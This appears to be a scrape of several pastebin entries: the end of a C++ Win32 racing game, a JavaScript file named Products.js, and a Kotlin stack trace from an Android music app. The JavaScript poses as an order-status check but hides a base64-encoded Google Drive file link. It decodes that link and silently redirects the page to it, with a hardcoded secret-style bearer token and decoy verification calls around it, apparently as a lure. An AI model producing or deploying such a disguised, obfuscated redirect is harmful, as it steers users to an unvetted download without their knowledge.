            Ellipse(memDC,
                (int)rightHeadlightX, (int)rightHeadlightY,
                (int)(rightHeadlightX + aiheadlightSize), (int)(rightHeadlightY + aiheadlightSize)
            );
            DeleteObject(aiHeadlightBrush);


            float windowDistance = headlightDistance + 10.0f;
            float windowX = cx + frontDirX * windowDistance;
            float windowY = cy + frontDirY * windowDistance;
            int   wsW = int(CAR_WIDTH * 0.7f);
            int   wsH = CAR_HEIGHT / 8;

            HBRUSH winBrush = CreateSolidBrush(RGB(0, 0, 0));
            SelectObject(memDC, winBrush);

            //misbehaving chunk of rectangle protrusion commented-out
            /*Rectangle(memDC,
                int(windowX - wsW / 2), int(windowY - wsH / 2),
                int(windowX + wsW / 2), int(windowY + wsH / 2)
            );*/

            float sideOffset = wsW / 2 + 4.0f;  // push out from window edge
            int   sideW = 3;             // ~3px thick
            int   sideH = wsH;           // same height as windscreen


            float lwX = windowX - perpX * sideOffset;
            float lwY = windowY - perpY * sideOffset;
            Rectangle(memDC,
                int(lwX - sideW / 2), int(lwY - sideH / 2),
                int(lwX + sideW / 2), int(lwY + sideH / 2)
            );

            float rwX = windowX + perpX * sideOffset;
            float rwY = windowY + perpY * sideOffset;
            Rectangle(memDC,
                int(rwX - sideW / 2), int(rwY - sideH / 2),
                int(rwX + sideW / 2), int(rwY + sideH / 2)
            );
            DeleteObject(winBrush);
            }





        //original AI code
        /* HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
        SelectObject(memDC, blueBrush);
        savedDC = SaveDC(memDC);
        SetGraphicsMode(memDC, GM_ADVANCED);
        XFORM xform2;
        xform2.eM11 = (FLOAT)cos(aiAngle);
        xform2.eM12 = (FLOAT)sin(aiAngle);
        xform2.eM21 = (FLOAT)-sin(aiAngle);
        xform2.eM22 = (FLOAT)cos(aiAngle);
        xform2.eDx = (FLOAT)aiX + CAR_WIDTH / 2;
        xform2.eDy = (FLOAT)aiY + CAR_HEIGHT / 2;
        SetWorldTransform(memDC, &xform2);
        Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);

        HBRUSH aiheadlightBrush = CreateSolidBrush(RGB(255, 255, 255));
        SelectObject(memDC, aiheadlightBrush);
        int aiheadlightSize = 8;

        // Define AI headlight positions based on calculated offsets
        Ellipse(memDC, -CAR_WIDTH / 4 - aiheadlightSize / 2, -CAR_HEIGHT / 2 + 5,
            -CAR_WIDTH / 4 + aiheadlightSize / 2, -CAR_HEIGHT / 2 + 5 + aiheadlightSize);
        Ellipse(memDC, CAR_WIDTH / 4 - aiheadlightSize / 2, -CAR_HEIGHT / 2 + 5,
            CAR_WIDTH / 4 + aiheadlightSize / 2, -CAR_HEIGHT / 2 + 5 + aiheadlightSize);

        DeleteObject(aiheadlightBrush);
        RestoreDC(memDC, savedDC);
        DeleteObject(blueBrush); */

        // Draw countdown timer if game hasn't started
        if (!gameStarted)
        {
            char timerText[10];
            sprintf_s(timerText, ""%d"", timer / 10);
            SetTextColor(memDC, RGB(255, 0, 0));
            SetBkMode(memDC, TRANSPARENT);
            TextOutA(memDC, WIDTH / 2 - 10, HEIGHT / 2 - 10, timerText, strlen(timerText));
        }

        // Draw God Mode text indicator
        if (godMode)
        {
            SetTextColor(memDC, RGB(255, 0, 0));
            SetBkMode(memDC, TRANSPARENT);
            TextOutA(memDC, 10, 10, ""God Mode ON"", 11);
        }

        // Copy from memory DC to screen
        BitBlt(hdc, 0, 0, WIDTH, HEIGHT, memDC, 0, 0, SRCCOPY);

        // Clean up
        SelectObject(memDC, oldBitmap);
        DeleteObject(memBitmap);
        DeleteDC(memDC);

        EndPaint(hWnd, &ps);
        break;
    }
    case WM_DESTROY:
        KillTimer(hWnd, 1);
        PostQuitMessage(0);
        break;
    case WM_KEYDOWN:
        if (wParam == VK_F1)
        {
            MessageBoxW(hWnd, L""2D Racing Game 3.0 Programmed in C++ Win32 API (491 lines of code) by Entisoft Software (c) Evans Thorpemorton"", L""About"", MB_OK | MB_ICONINFORMATION); // orig 395 lines
        }
        //break;
        if (wParam == VK_ESCAPE)
        {
            PostQuitMessage(0);
        }
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Register window class
    WNDCLASSEX wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));        // Modified line
    //wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = L""RacingGame"";
    wc.hIconSm = (HICON)LoadImage(hInstance,                           // Modified line
        MAKEINTRESOURCE(IDI_ICON1),           // Modified line
        IMAGE_ICON,                           // Modified line
        16,                                   // Modified line
        16,                                   // Modified line
        LR_DEFAULTCOLOR);                     // Modified line
    //wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
    RegisterClassEx(&wc);

    // Calculate the position to center the window
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowX = (screenWidth - WIDTH) / 2;
    int windowY = (screenHeight - HEIGHT) / 2;

    // Create window
    HWND hWnd = CreateWindowEx(0, L""RacingGame"", L""Racing Game (ArrowKeys=Move G=GodMode)"", WS_OVERLAPPEDWINDOW, windowX, windowY, WIDTH, HEIGHT, NULL, NULL, hInstance, NULL);

    // Show window
    //ShowWindow(hWnd, nCmdShow);
    ShowWindow(hWnd, SW_SHOWMAXIMIZED);

    // Main loop
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
```"
rNikZn5s,Products.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 12:25:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91428/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LnNMTvYs,2025-04-19T07:25:42.784730,powerampache,PHP,Saturday 19th of April 2025 12:25:42 AM CDT,"1.00-70 (70) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
